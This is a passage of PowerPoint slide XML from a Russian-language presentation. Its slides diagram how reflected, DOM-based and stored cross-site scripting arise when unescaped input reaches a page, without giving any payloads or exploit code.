                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5848350" y="3240881"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-laptop-23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9891712" y="2962275"/>
            <a:ext cx="371475" cy="278606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component-laptop-24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9829800" y="3240881"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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8" name="Рисунок 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD222BF9-5452-48EB-B931-A8EF7A45F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2117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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5DA9D1F-7703-4DD9-AF57-A7E0E868C680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Reflected XSS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9273A19A-38A7-41C1-9DA5-3187078AF4B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Сервер включает ввод текущего запроса в HTML-ответ. Внедрённый код выполняется в браузере.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="server-zone">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5BFD2429-86C2-4E6E-925A-91FD1BD3CDF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2562225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Сервер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="browser-zone">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FC67A1A-5BBB-4619-B01C-0D6A433C94BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2562225"/>
            <a:ext cx="683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Браузер пользователя</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="process-node-server">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0376D601-F9F0-440A-A9F3-70E5572290D3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2857500" cy="2219325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erver-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F953C06-21B5-436F-9D42-4A340D0BC1A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="819150" y="3276600"/>
            <a:ext cx="2590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Приложение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="server-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2161F35-E315-4EC0-8966-59D256FEA25A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3705225"/>
            <a:ext cx="2552700" cy="1533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Получает ввод запроса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Подставляет его в HTML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без экранирования</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="process-node-processing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC0AF7CF-1BC6-4AD8-83A8-510734D2CA5D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="3105150"/>
            <a:ext cx="2857500" cy="2219325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8D9B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processing-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BF9BFEF-5BBC-4F43-9E1C-CE73403454C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="3276600"/>
            <a:ext cx="2590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HTML-парсер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="processing-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BC1FC248-8C0F-4B15-9B7D-5AAC5867D802}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819650" y="3705225"/>
            <a:ext cx="2552700" cy="1533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Разбирает HTML-ответ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Строит DOM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страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="process-node-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3D73DD8-8600-47FE-AEE6-5C738701AA72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="3105150"/>
            <a:ext cx="2857500" cy="2219325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dom-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D48B0096-CFC9-4778-8FAA-B29D4FA37C1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8782050" y="3276600"/>
            <a:ext cx="2590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DOM страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="dom-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B7BCEB5-3FDA-4F98-9A84-A0470E267A81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8801100" y="3705225"/>
            <a:ext cx="2552700" cy="1533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 странице появляется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внедрённый код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Браузер выполняет JS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6BEC1771-73AB-4A56-9148-5E085FE5728F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4162425"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B8509825-35C7-4FF3-BFE3-F21FD39159DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="3581400"/>
            <a:ext cx="1009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HTML +</a:t>
            </a:r>
          </a:p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ввод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{597ABD03-2D7C-4F56-B32A-7C5355CB21C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4162425"/>
            <a:ext cx="1123950" cy="0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7" name="flow-label-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3814D2C1-031F-48BA-9F7B-A22A9B87870A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="3581400"/>
            <a:ext cx="1009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Разбор</a:t>
            </a:r>
          </a:p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HTML</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Рисунок 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B319DE63-AB23-4553-A427-33DD8C01A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22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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71D91367-CB31-43F7-8C8A-4FAFF789BF08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DOM-based XSS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3783C3A6-930B-43A2-A99D-E55AF7FBE82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JavaScript страницы читает недоверенные данные и передаёт их в опасную точку обработки DOM.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="server-zone">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{166501CD-180F-4638-87F9-BC688D7A5D07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2562225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Сервер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="browser-zone">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05B98784-1C9E-4832-A45B-F69C4446FC5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2562225"/>
            <a:ext cx="683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Браузер пользователя</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="process-node-server">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E17FA320-BC32-42F3-92F4-439C9605B07D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2857500" cy="2219325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8D9B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erver-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F63F59B-14D4-40B8-BE50-F98D0E28B757}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="819150" y="3276600"/>
            <a:ext cx="2590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Приложение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="server-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AB8CE9AE-461F-4E4D-B2BC-647F5F5341DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3705225"/>
            <a:ext cx="2552700" cy="1533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Отдаёт страницу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и JavaScript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приложения</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="process-node-processing">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34FCCCBF-5A53-4DD7-9393-84472C5F8863}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="3105150"/>
            <a:ext cx="2857500" cy="2219325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processing-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DC2A7E2-AA17-402C-BBA7-4D485B9C357B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="3276600"/>
            <a:ext cx="2590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JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="processing-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E095B69-663D-471A-944E-353C0429D700}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819650" y="3705225"/>
            <a:ext cx="2552700" cy="1533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Читает URL или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хранилище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Небезопасно вставляет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данные в DOM</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="process-node-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F813698E-026F-4DEC-935A-7C6B9343121E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="3105150"/>
            <a:ext cx="2857500" cy="2219325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dom-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3BAF5D04-7D2E-4C05-804E-EC842596D01C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8782050" y="3276600"/>
            <a:ext cx="2590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DOM страницы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="dom-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1F2ABB9E-82D7-43B1-9D1D-CB08D7AA50F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8801100" y="3705225"/>
            <a:ext cx="2552700" cy="1533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 странице появляется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внедрённый код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Браузер выполняет JS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AE1103F8-23FB-4017-8372-8B016FE72037}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3543300" y="4162425"/>
            <a:ext cx="1123950" cy="0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5" name="flow-label-page">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67760069-031C-44C7-8734-F9F6F1FE0966}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3600450" y="3581400"/>
            <a:ext cx="1009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HTML +</a:t>
            </a:r>
          </a:p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JS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AD85A5AE-24FC-455A-ADF3-D63E07CC1DB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7524750" y="4162425"/>
            <a:ext cx="1123950" cy="0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7" name="flow-label-dom">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C60401A4-DD8B-4B54-986E-97A3D99ACA9C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7581900" y="3581400"/>
            <a:ext cx="1009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Вставка</a:t>
            </a:r>
          </a:p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HTML</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="Рисунок 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D1FE437-8FE0-4D7E-9F7F-32D92B06D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251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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01058330-C17B-48BB-BFDF-4FE468E98C1F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lang="en-US" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3300" b="1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XSS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DA6BE63C-63A1-453E-89D7-77E4A56C8BC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Один пользователь сохраняет данные. Другой открывает страницу, куда сохранённое значение вставляется как HTML.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="process-node-author">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B2352E3-152D-458D-87E3-0BF25EAE6C0D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2857500" cy="137160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8D9B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author-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4A60916-C5C6-4B51-B553-53F40B2678CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1238250" y="2705100"/>
            <a:ext cx="2152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Браузер автора</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="author-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67F1573F-13D2-4164-B038-8E87AA2E07FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3152775"/>
            <a:ext cx="2552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Отправляет пост</a:t>
            </a:r>
          </a:p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или комментарий</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="process-node-app">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8285DB10-A98A-4933-B9F4-EF198F43EDED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4667250" y="2571750"/>
            <a:ext cx="2857500" cy="339090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app-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13A21E00-3CAD-403A-9FF6-DB76A559D5A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4838700" y="3390900"/>
            <a:ext cx="2514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Приложение</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="app-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E113FF32-0B98-4E17-92CA-5E9AD303DF4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="3867150"/>
            <a:ext cx="2476500" cy="2009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Сохраняет текст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Читает его для страницы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Вставляет в HTML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без экранирования</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="process-node-db">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6B22ECD5-AF7D-4598-9D64-0ADC114B8939}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8648700" y="2571750"/>
            <a:ext cx="2857500" cy="224790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8D9B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db-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{350C3E93-F128-41A8-8CD5-87034E8EC04C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8820150" y="3390900"/>
            <a:ext cx="2514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База данных</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="db-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7AAC83D-005C-490A-BAAF-F18AB42F869B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8839200" y="3867150"/>
            <a:ext cx="24765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Хранит содержимое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между запросами</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="process-node-reader">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
